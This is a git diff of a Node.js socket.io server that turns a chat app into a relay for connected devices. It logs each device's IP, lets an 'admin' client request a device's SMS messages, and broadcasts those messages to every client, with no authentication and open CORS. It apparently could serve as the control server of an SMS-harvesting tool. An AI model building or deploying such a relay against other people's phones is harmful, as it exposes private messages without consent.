@@ -1,44 +1,74 @@
 const { Server } = require('socket.io')
 
+const { deviceConnect, deviceDisconnect, getConnectedDevices } = require('./utils/devices')
+
+const PORT = process.env.PORT || 3000
+
 const io = new Server({
     cors: {
         origin: '*'
     }
 })
 
-let liveUser = 0;
-
-const updateLiveUser = (simbol) => {
-    if(simbol == '+') {
-
-    io.emit('liveUser', ++liveUser)
-    } else {
-
-    io.emit('liveUser', --liveUser)
-    }
-}
+const room = 'devices'
 
 io.on('connection', socket => {
-    console.log('New User Connected');
 
-    // Send live user count
-    updateLiveUser('+')
 
-    socket.on('message', msg => {
-        console.log(msg)
-        // send chat message to all user except sender
-        socket.broadcast.emit('message', msg)
+    socket.on('joinRoom', deviceName => {
+        let clientAddress = socket.request.connection;
+        let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
 
-        // send chat message to all user
-        // socket.emit('message', msg)
+        const device = deviceConnect(socket.id, deviceName, clientIP, room)
 
+        // Join a room
+        socket.join(device.room)
+
+        // // Send Connected devices to admin
+        // io.to(room).emit('devices', getConnectedDevices(room))
+
+        io.emit('devices', getConnectedDevices(room))
     })
 
-    socket.on('disconnect', () => {
-        console.log('User disconnected.');
-        // Remove a user from liveUser
-        updateLiveUser('-')
+    //load SMS
+
+    socket.on('loadSms', deviceId => {
+        io.to(deviceId).emit('loadSms')
+    });
+
+    socket.on('sendSms', sms => {
+        io.emit('getSms', sms)
+    })
+
+
+
+    // Send Connected devices to admin
+    socket.emit('devices', getConnectedDevices(room))
+
+    socket.on('disconnect', aa => {
+        // Remove a device from array
+        const device = deviceDisconnect(socket.id)
+
+        // Notify all client to updated connected devices
+        // io.to(room).emit('devices', getConnectedDevices(room))
+        io.emit('devices', getConnectedDevices(room))
     })
 })
 
-io.listen(process.env.PORT)
+
+
+
+
+
+
+
+
+
+
+try {
+    io.listen(PORT)
+    console.log(`Server runing at port: ${PORT}`);
+} catch (error) {
+    console.log(`Error: ${error.message}`)
+    process.exit(1)
+}
